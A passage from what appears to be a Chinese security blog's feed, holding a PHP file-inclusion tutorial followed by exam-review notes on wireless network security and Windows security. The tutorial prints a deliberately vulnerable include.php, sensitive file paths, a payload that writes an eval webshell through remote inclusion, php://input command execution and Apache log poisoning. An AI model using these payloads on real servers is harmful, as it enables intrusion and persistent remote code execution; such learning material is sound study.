id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><blockquote><p>This option allows the use of URL-aware fopen wrappers with the following<br>functions: include，include_once    </p></blockquote><h4 id="allow-url-fopen"><a href="#allow-url-fopen" class="headerlink" title="allow_url_fopen"></a>allow_url_fopen</h4><blockquote><p>本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问远程文件，一些扩展库例如zlib 可能会注册更多的封装协议</p></blockquote><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>在本机根目录放上include.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在远程服务器上放上需要包含的文件hack.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hacked by Gard3nia 2333333~~~~~'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试远程文件包含成功：</p><p><img src="https://s2.ax1x.com/2019/05/31/Vlb9rq.png" alt="Vlb9rq.png"></p><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><ol><li>具有相关包含的函数；</li><li>文件包含中存在动态变量如<code>include $file;</code>；</li><li>文件包含中的动态变量可控；</li></ol><h3 id="PHP文件包含的利用"><a href="#PHP文件包含的利用" class="headerlink" title="PHP文件包含的利用"></a>PHP文件包含的利用</h3><h4 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1.读取敏感文件"></a>1.读取敏感文件</h4><ul><li><p>Linux系统(实测ubuntu)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd                                 //用户</span><br><span class="line"></span><br><span class="line">/etc/apache2/apache2.conf                  //apache2配置文件</span><br><span class="line"></span><br><span class="line">/etc/php/php.ini                          //php配置文件</span><br><span class="line"></span><br><span class="line">/etc/mysql/my.cnf                        //mysql配置文件</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/05/31/VlLuE6.png" alt="VlLuE6.png"><img src="https://s2.ax1x.com/2019/05/31/VlLlCD.png" alt="VlLlCD.png"></p></li><li><p>Windows系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini</span><br><span class="line">c:\windows\systems32\inetsrv\MetaBase.xml</span><br><span class="line">c:\windows\repair\sam</span><br><span class="line">c:\windows\php.ini             php配置文件</span><br><span class="line">c:\windows\my.ini               mysql配置文件</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-远程包含Shell"><a href="#2-远程包含Shell" class="headerlink" title="2.远程包含Shell"></a>2.远程包含Shell</h4><p>​    如果主机的<code>allow_url_fopen</code>选项是激活的，那么就可以尝试远程包含一句话木马，先在远程服务器的根目录放上生成一句话的txt文件kk.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST["kk"]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.175.1/include.php?file=http://192.168.175.173/kk.txt</span><br></pre></td></tr></table></figure><p>在<code>include.php</code>的同级目录下会生成Webshell，直接连接Antsword即可Getshell；</p><h4 id="3-本地包含配合文件上传"><a href="#3-本地包含配合文件上传" class="headerlink" title="3.本地包含配合文件上传"></a>3.本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传，上传一个图片木马kk.jpg，内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST["kk"]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.175.1/include.php?file=http://192.168.175.173/upload/kk.jpg</span><br></pre></td></tr></table></figure><p>即可在同级目录下生成Webshell</p><h4 id="4-使用PHP封装协议"><a href="#4-使用PHP封装协议" class="headerlink" title="4.使用PHP封装协议"></a>4.使用PHP封装协议</h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">file://</td><td style="text-align:center">访问本地文件系统</td></tr><tr><td style="text-align:center">http://</td><td style="text-align:center">访问网址</td></tr><tr><td style="text-align:center">ftp://</td><td style="text-align:center">访问ftp urls</td></tr><tr><td style="text-align:center">php://</td><td style="text-align:center">访问输入输出流</td></tr><tr><td style="text-align:center">zlib://</td><td style="text-align:center">压缩流</td></tr><tr><td style="text-align:center">data://</td><td style="text-align:center">数据流</td></tr><tr><td style="text-align:center">ssh2://</td><td style="text-align:center">Secure Shell 2</td></tr><tr><td style="text-align:center">expect://</td><td style="text-align:center">处理交互式的流</td></tr><tr><td style="text-align:center">glob://</td><td style="text-align:center">查找匹配的文件路径</td></tr><tr><td style="text-align:center">phar://</td><td style="text-align:center">PHP归档</td></tr><tr><td style="text-align:center">rar://</td><td style="text-align:center">RAR</td></tr></tbody></table><ul><li><p>file://</p><p>通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响，只需要文件路径即可，先上include.php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用file协议流读取本地文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://D:/PHPstudy/PHPTutorial/WWW/gardenia.txt</span><br></pre></td></tr></table></figure><p>成功回显：</p><p><img src="https://s2.ax1x.com/2019/06/02/VGcdmD.png" alt="VGcdmD.png"></p></li><li><p>php://</p><p>在CTF中经常使用的是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter     //在双off的情况下也可以正常使用；</span><br><span class="line">php://input      //需要开启allow_url_include</span><br></pre></td></tr></table></figure><p>1.使用封装协议读PHP文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><p>例如我们平时用来读文件的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure><p>这里读的过滤器为<code>convert.base64-encode</code>，把输入流<code>base64-encode</code>，<code>resource=xxx.php</code>，读取到的<code>xxx.php</code>的内容就会被base64加密显示出来；</p><p>2.写入PHP文件</p><p>使用php://input可以执行PHP语句，但是使用时需要注意，此协议受限于<code>allow_url_include</code>选项，使用方法就是，直接构造url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br></pre></td></tr></table></figure><p>POST过去php语句即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>); <span class="meta">?&gt;</span>   <span class="comment">//执行系统命令</span></span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST["kk"]);?&gt;'</span>)<span class="meta">?&gt;</span> <span class="comment">//写马</span></span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://s2.ax1x.com/2019/06/02/VG2jY9.png" alt="VG2jY9.png"></p></li></ul><h4 id="5-包含Apache日志文件"><a href="#5-包含Apache日志文件" class="headerlink" title="5.包含Apache日志文件"></a>5.包含Apache日志文件</h4><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>用于发现了文件包含漏洞但是无法上传文件，这样的话就无法深度利用此漏洞，这就要用到另一招，找到Apache的日志路径，利用包含漏洞包含Apache的日志文件获取Webshell，需要知道服务器日志的存储路径，且日志文件可读；</p><h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，如果访问一个不存在的页面，apache也会将这个页面写入access.log中；</p><p><img src="https://s2.ax1x.com/2019/06/02/VGfKIg.png" alt="VGfKIg.png"></p><p>但是需要注意的是<code>&lt;&gt;</code>和空格都被url转码了，需要使用bp抓包绕过：</p><p><img src="https://s2.ax1x.com/2019/06/02/VGfwi4.png" alt="VGfwi4.png"></p><p>查看日志文件，发现成功绕过（phpinfo只是用于测试，真正的攻击者会植入一个写马脚本）：</p><p><img src="https://s2.ax1x.com/2019/06/02/VGf7OP.png" alt="VGf7OP.png"></p><p>接下来攻击者要做的就是确定access.log的位置，包含日志文件即可，本机默认的apache日志文件位置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/error.log</span><br></pre></td></tr></table></figure><p>不知道为什么我Docker里的测试没有成功，可能是因为权限问题，但是改了权限好像也没什么luan用，只好在本机测试，拿下…</p><p><img src="https://s2.ax1x.com/2019/06/02/VG45rt.png" alt="VG45rt.png"></p><p>在一些场景中，log的地址是被修改掉的。可以通过读取相应的配置文件后，再进行包含；</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>更多姿势，未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;初衷是灵活方便，殊不知方便永远是安全最大的敌人；
    
    </summary>
    
      <category term="Web安全学习笔记" scheme="https://gardenia30.top/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web安全" scheme="https://gardenia30.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件包含" scheme="https://gardenia30.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>移动网络安全复习</title>
    <link href="https://gardenia30.top/2019/05/22/%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/"/>
    <id>https://gardenia30.top/2019/05/22/移动网络安全复习/</id>
    <published>2019-05-22T12:29:34.000Z</published>
    <updated>2019-05-23T12:37:54.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为考试而生的第二篇文章，作为了解知识…<a id="more"></a></p><h1 id="移动网络安全"><a href="#移动网络安全" class="headerlink" title="移动网络安全"></a>移动网络安全</h1><h2 id="无线网络分类-按传播范围"><a href="#无线网络分类-按传播范围" class="headerlink" title="无线网络分类(按传播范围)"></a>无线网络分类(按传播范围)</h2><ol><li><p>无线个域网<code>Wireless Personal Area Network</code>(WPAN)</p><p>传输距离：10m左右；</p><p>技术：IEEE 802.15，蓝牙，ZigBee</p><p>传输速度：10Mbit/s</p></li><li><p>无线局域网<code>Wireless Local Area Network</code>(WLAN)</p><p>传输距离：几十米-几千米；</p><p>技术：IEEE 802.11</p><p>传输速率：11Mbit.s-1Gbit/s</p></li><li><p>无线城域网<code>Wireless Metropolitan Area Network</code>(WMAN)</p><p>传输距离：城市大部分地区</p><p>技术：IEEE 802.16</p></li><li><p>无线广域网<code>Wireless Wide Area Network</code>(WWAN)</p><p>传输距离：移动卫星通信</p><p>技术：2G,3G(2M/S),4G(几十到几百M/S)</p></li></ol><h2 id="WLAN安全机制"><a href="#WLAN安全机制" class="headerlink" title="WLAN安全机制"></a>WLAN安全机制</h2><h3 id="WEP的安全问题"><a href="#WEP的安全问题" class="headerlink" title="WEP的安全问题"></a>WEP的安全问题</h3><h4 id="RC4的安全问题"><a href="#RC4的安全问题" class="headerlink" title="RC4的安全问题"></a>RC4的安全问题</h4><p><img src="https://s2.ax1x.com/2019/05/18/EX9M3q.png" alt="EX9M3q.png"></p><h4 id="无抗重放攻击"><a href="#无抗重放攻击" class="headerlink" title="无抗重放攻击"></a>无抗重放攻击</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXkN1s.png" alt="EXkN1s.png"></p><h4 id="sk的产生和分发"><a href="#sk的产生和分发" class="headerlink" title="sk的产生和分发"></a>sk的产生和分发</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXkT4e.png" alt="EXkT4e.png"></p><h4 id="IV空间太小"><a href="#IV空间太小" class="headerlink" title="IV空间太小"></a>IV空间太小</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXkvHf.png" alt="EXkvHf.png"></p><h4 id="CRC32是线性的"><a href="#CRC32是线性的" class="headerlink" title="CRC32是线性的"></a>CRC32是线性的</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXAp4g.png" alt="EXAp4g.png"></p><h3 id="WEP认证机制"><a href="#WEP认证机制" class="headerlink" title="WEP认证机制"></a>WEP认证机制</h3><h4 id="开放系统认证（默认）"><a href="#开放系统认证（默认）" class="headerlink" title="开放系统认证（默认）"></a>开放系统认证（默认）</h4><p>认证以明文形式传输</p><p>适合安全需求较低的场合</p><p><img src="https://s2.ax1x.com/2019/05/18/EXEesI.png" alt="EXEesI.png"></p><h4 id="共享密钥认证"><a href="#共享密钥认证" class="headerlink" title="共享密钥认证"></a>共享密钥认证</h4><p>以WEP为基础，基于挑战响应机制</p><p><img src="https://s2.ax1x.com/2019/05/18/EXEZQA.png" alt="EXEZQA.png"></p><h3 id="TKIP机密机制"><a href="#TKIP机密机制" class="headerlink" title="TKIP机密机制"></a>TKIP机密机制</h3><p>包裹在WEP外面的一层算法（既要兼容WEP又要解决WEP安全问题的产物）</p><h4 id="TKIP的改进"><a href="#TKIP的改进" class="headerlink" title="TKIP的改进"></a>TKIP的改进</h4><ul><li>IV：24bit-&gt;48bit</li><li>WEP密钥sk：40bit-&gt;104bit</li><li>四个新算法<img src="https://s2.ax1x.com/2019/05/18/EXEqmt.png" alt="EXEqmt.png"></li></ul><h3 id="IEEE802-11i认证和密钥交换协议"><a href="#IEEE802-11i认证和密钥交换协议" class="headerlink" title="IEEE802.11i认证和密钥交换协议"></a>IEEE802.11i认证和密钥交换协议</h3><p>四步握手过程：</p><p><img src="https://s2.ax1x.com/2019/05/18/EXZIsA.png" alt="EXZIsA.png"></p><p><img src="https://s2.ax1x.com/2019/05/18/EXZbIf.png" alt="EXZbIf.png"></p><h2 id="GSM安全（2G）"><a href="#GSM安全（2G）" class="headerlink" title="GSM安全（2G）"></a>GSM安全（2G）</h2><h3 id="GSM的鉴权机制"><a href="#GSM的鉴权机制" class="headerlink" title="GSM的鉴权机制"></a>GSM的鉴权机制</h3><p><img src="https://s2.ax1x.com/2019/05/18/EXKk7R.png" alt="EXKk7R.png"></p><h3 id="GSM加密机制"><a href="#GSM加密机制" class="headerlink" title="GSM加密机制"></a>GSM加密机制</h3><p><img src="https://s2.ax1x.com/2019/05/18/EXKfu4.png" alt="EXKfu4.png"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>待我Web安全学成归来，必会回首再来看你！！！！<del>(手动狗头)</del></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;为考试而生的第二篇文章，作为了解知识…
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="移动网络安全" scheme="https://gardenia30.top/tags/%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>操作系统安全复习</title>
    <link href="https://gardenia30.top/2019/05/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/"/>
    <id>https://gardenia30.top/2019/05/09/操作系统安全复习/</id>
    <published>2019-05-09T08:48:35.000Z</published>
    <updated>2019-05-23T12:25:40.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因考试复习而生的一篇博客…<a id="more"></a></p><h1 id="操作系统安全复习"><a href="#操作系统安全复习" class="headerlink" title="操作系统安全复习"></a>操作系统安全复习</h1><h2 id="第1-2章-windows系统安全概述"><a href="#第1-2章-windows系统安全概述" class="headerlink" title="第1~2章-windows系统安全概述"></a>第1~2章-windows系统安全概述</h2><h3 id="信息安全评估标准-TCSEC"><a href="#信息安全评估标准-TCSEC" class="headerlink" title="信息安全评估标准  TCSEC"></a>信息安全评估标准  TCSEC</h3><blockquote><p>A级：校验级保护，提供低级别手段</p><p>B3级：安全域，数据隐藏与分层，屏蔽</p><p>B2级：结构化内容保护，支持硬件保护</p><p>B1级：标记安全保护，如System V等</p><p>C2级：有自主的访问安全，区分用户</p><p>C1级：不区分用户，基本的访问控制</p><p>D级：没有安全性可言，MS DOS</p></blockquote><h3 id="Windows的安全体系结构，组件"><a href="#Windows的安全体系结构，组件" class="headerlink" title="Windows的安全体系结构，组件"></a>Windows的安全体系结构，组件</h3><p>Windows的NT体系结构分为</p><h4 id="内核模式"><a href="#内核模式" class="headerlink" title="内核模式"></a>内核模式</h4><p>1.代码具有极高的特权，可以直接对硬件进行操作和直接访问所有的内存空间</p><p>2.组成内核模式的整套服务被称为执行服务</p><p>​    对象管理器（OM:Object Manager）</p><p>​    安全引用监控器（SRM: security reference monitor） </p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>1.代码具有较低的权限，不能对硬件直接进行访问，内存访问受限</p><p>2.本地安全子系统：支持Windows的身份验证，审核 </p><p>​    核心：LSA（local security authentication）</p><p>​    需要和win32子系统通信</p><h4 id="本地安全授权（LSA）"><a href="#本地安全授权（LSA）" class="headerlink" title="本地安全授权（LSA）"></a>本地安全授权（LSA）</h4><p>1.LSA负责使所有本地和远程的用户登录生效，生成安全访问令牌; 访问令牌：访问令牌是一个二进制的数据包，它描述了用户的访问权限以及用户所属的组；</p><p>2.管理本地安全策略 </p><p>3.负责记录安全引用监视器(SRM)的任何审核 消息所产生的事件日志</p><h3 id="Windows-的用户和用户组"><a href="#Windows-的用户和用户组" class="headerlink" title="Windows 的用户和用户组"></a>Windows 的用户和用户组</h3><h4 id="用户账户"><a href="#用户账户" class="headerlink" title="用户账户"></a>用户账户</h4><p>1.使用用户名和密码进行标识</p><p>2.SID（Security Identifiers）：账户的关键标识符,所有内部进程都使用SID识别用户账号</p><h4 id="用户组账户"><a href="#用户组账户" class="headerlink" title="用户组账户"></a>用户组账户</h4><p>1.具有相似工作或资源要求的用户可组成一个用户组</p><p>2.对资源的存取权限许可分配给一用户组，就是同时分配 给该组中的所有成员</p><h4 id="内置用户账号"><a href="#内置用户账号" class="headerlink" title="内置用户账号"></a>内置用户账号</h4><p>Administrator 和 Guest ， Adminstrator账号是最高级别的账号，应重命名该账号 并设置密码以隐藏它，以免受到攻击，保持Guest账号的禁用状态。 </p><h4 id="内置用户组账号"><a href="#内置用户组账号" class="headerlink" title="内置用户组账号"></a>内置用户组账号</h4><blockquote><p>Administrators ：管理员组 </p><p>Guests ：来宾用户组 </p><p>Backup Operators 备份操作组，做系统的备份操作 </p><p>Replicator ：复制操作组 </p><p>Domain*(Administrators, Users, Guests) ：只 在域服务器上的组 </p><p>特殊组(Network, Interative,  Everyone, ….) </p><p>*Operators（Print ,Account, Server） </p></blockquote><h3 id="域及其信任关系"><a href="#域及其信任关系" class="headerlink" title="域及其信任关系"></a>域及其信任关系</h3><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>域是一批具有集中安全授权机构和若干台工作站和成员服务器的计算机集合。</p><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><p>1.域为用户，组和计算机账户定义了管理边界范围 </p><p>2.一个域中的所有用户共享域用户账户数据库和普通的安全策略。</p><p>3.每台计算机不需要提供自己的验证服务。</p><p>4.一旦用户用域验证服务通过验证，就可以在域内访问权限内资源了，如<code>Exchange Server，SharePoint Server，File Server，SQL Server，打印机共享</code>。 </p><h4 id="信任关系"><a href="#信任关系" class="headerlink" title="信任关系"></a>信任关系</h4><p>当网络更大时，可以用信任关系来创建并链接多个域；</p><p>1.信任关系是域之间的关系，当域之间建立信任关系后，一个域就可以信任另一个域的用户访问自己的资源，而又不必在本域拥有这个用户的账户和口令；</p><p>2.好处：实现跨域的集中安全验证 ，支持用户的单一登录 ；</p><h4 id="信任关系种类"><a href="#信任关系种类" class="headerlink" title="信任关系种类"></a>信任关系种类</h4><p>1.单向信任关系： 信任域—&gt;受信任域 </p><p>2.双向信任关系：信任域<---->受信任域 </----></p><h2 id="第3章-活动目录"><a href="#第3章-活动目录" class="headerlink" title="第3章-活动目录"></a>第3章-活动目录</h2><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>1.活动目录是以层次化方式存储网络资源信息的目录；</p><p>2.通过它，组织机构可以有效地对分布式环境的网络对象进行共享和管理；</p><p>3.目录在网络安全方面扮演着中心授权机构的角色，从而使操作系统可以轻松验证用户身份并控制其对网络资源的访问</p><h4 id="功能机制"><a href="#功能机制" class="headerlink" title="功能机制"></a>功能机制</h4><p>1.单点登录</p><p>用户只需要登录一次就可以访问所有相互信任的应用系统</p><p>2.全局目录（Global Catalog）</p><ul><li>默认情况下，全局编录在域森林的初始域控制器上自动创建。该域控制器就称为全局编录服务器，后面也可配 置其他域控制器为全局编录服务器；</li><li>全局编录是一个域树或者域森林中的所有对象信息的中心仓库。它记录了AD中所有域对象的部分信息 以及架构信息和配置信息的完整副本；</li><li>执行两个关键目录任务：登录和查询；<ul><li>在客户登录时：向域控制器提供通用组成员信息 ，用户登录网络时，必须存在一台全局编录服务器，否则只能登录到本地，例外是“域管理组中的成员”。</li><li>在客户查询目录信息时，用户在发出查询请求时首先会送到最近的全局编录 （GC），通常GC可满足绝大多数查询，只有当查询 对象信息不在GC中时，服务器才会将查询转至对象所在域。从而实现跨所有域的搜索</li></ul></li></ul><p>3.智能的信息复制</p><ul><li>通过安装域控制器，可在整个网络环境中创建目录 的多份副本；</li><li>网络任何地方发生变化都会在整个网络中自动复制, 保证数据一致性；</li></ul><p>4.组策略：可以在不同层次上定义控制规则</p><h4 id="活动目录保存的信息"><a href="#活动目录保存的信息" class="headerlink" title="活动目录保存的信息"></a>活动目录保存的信息</h4><p><img src="https://s2.ax1x.com/2019/05/12/Eh0Pgg.png" alt="Eh0Pgg.png"></p><h3 id="活动目录对象"><a href="#活动目录对象" class="headerlink" title="活动目录对象"></a>活动目录对象</h3><h4 id="对象标准属性"><a href="#对象标准属性" class="headerlink" title="对象标准属性"></a>对象标准属性</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhBXkt.png" alt="EhBXkt.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/Eh69Cq.png" alt="Eh69Cq.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/Eh67dJ.png" alt="Eh67dJ.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/Eh6xsO.png" alt="Eh6xsO.png"></p><h4 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h4><p><img src="https://s2.ax1x.com/2019/05/12/Eh6qiR.png" alt="Eh6qiR.png"></p><h3 id="逻辑结构活动目录组件"><a href="#逻辑结构活动目录组件" class="headerlink" title="逻辑结构活动目录组件"></a>逻辑结构活动目录组件</h3><h4 id="组织单位"><a href="#组织单位" class="headerlink" title="组织单位"></a>组织单位</h4><p>组织单位主要用来委派对用户、组及资源集合的管理权限。组织单位是委派管理权限的最小分组，其特殊在于可连接组策略</p><p><img src="https://s2.ax1x.com/2019/05/12/EhcGlV.png" alt="EhcGlV.png"></p><h4 id="域-1"><a href="#域-1" class="headerlink" title="域"></a>域</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhcBf1.png" alt="EhcBf1.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/EhcXkj.png" alt="EhcXkj.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/EhgS10.png" alt="EhgS10.png"></p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhgMnO.png" alt="EhgMnO.png"></p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhgIUJ.png" alt="EhgIUJ.png"></p><h3 id="物理结构活动目录组件"><a href="#物理结构活动目录组件" class="headerlink" title="物理结构活动目录组件"></a>物理结构活动目录组件</h3><p><img src="https://s2.ax1x.com/2019/05/12/EhzV5d.png" alt="EhzV5d.png"></p><h2 id="第4章-组策略"><a href="#第4章-组策略" class="headerlink" title="第4章-组策略"></a>第4章-组策略</h2><h3 id="组策略设置对象"><a href="#组策略设置对象" class="headerlink" title="组策略设置对象"></a>组策略设置对象</h3><p>计算机和用户是仅有的接收组策略的活动目录对象类型；</p><p><img src="https://s2.ax1x.com/2019/05/12/EhXFt1.png" alt="EhXFt1.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/EhXNng.png" alt="EhXNng.png"></p><h3 id="组策略的应用顺序"><a href="#组策略的应用顺序" class="headerlink" title="组策略的应用顺序"></a>组策略的应用顺序</h3><p><img src="https://s2.ax1x.com/2019/05/12/EhzN2q.png" alt="EhzN2q.png"></p><h3 id="组策略的实现"><a href="#组策略的实现" class="headerlink" title="组策略的实现"></a>组策略的实现</h3><h4 id="企业框架的组织"><a href="#企业框架的组织" class="headerlink" title="企业框架的组织"></a>企业框架的组织</h4><h4 id="根据相应组织框架设计管理策略"><a href="#根据相应组织框架设计管理策略" class="headerlink" title="根据相应组织框架设计管理策略"></a>根据相应组织框架设计管理策略</h4><h4 id="与安全相关的设置"><a href="#与安全相关的设置" class="headerlink" title="与安全相关的设置"></a>与安全相关的设置</h4><h5 id="账户策略"><a href="#账户策略" class="headerlink" title="账户策略"></a>账户策略</h5><p>1.密码策略</p><p>2.账户锁定策略</p><p>3.kerberos策略</p><h5 id="本地策略"><a href="#本地策略" class="headerlink" title="本地策略"></a>本地策略</h5><p>1.审核策略</p><p>2.用户权利指派</p><p>3.安全选项</p><h4 id="可对不同层次安全单元进行策略设置"><a href="#可对不同层次安全单元进行策略设置" class="headerlink" title="可对不同层次安全单元进行策略设置"></a>可对不同层次安全单元进行策略设置</h4><h2 id="第5章-公钥基础结构"><a href="#第5章-公钥基础结构" class="headerlink" title="第5章-公钥基础结构"></a>第5章-公钥基础结构</h2><h3 id="公钥基础结构PKI"><a href="#公钥基础结构PKI" class="headerlink" title="公钥基础结构PKI"></a>公钥基础结构PKI</h3><h4 id="PKI组件"><a href="#PKI组件" class="headerlink" title="PKI组件"></a>PKI组件</h4><p><img src="https://s2.ax1x.com/2019/05/12/E4FEO1.png" alt="E4FEO1.png"></p><h5 